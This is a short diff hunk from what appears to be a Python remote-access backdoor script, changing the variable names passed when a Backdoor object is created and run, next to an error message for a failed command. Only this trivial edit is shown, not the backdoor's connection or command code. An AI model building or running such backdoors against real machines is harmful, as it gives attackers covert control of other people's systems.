@@ -65,5 +65,5 @@ class Backdoor:
                command_result = "[-] Error in command."
     
 
-my_backdoor = Backdoor(IP, Port)
+my_backdoor = Backdoor(ip, port)
 my_backdoor.run()
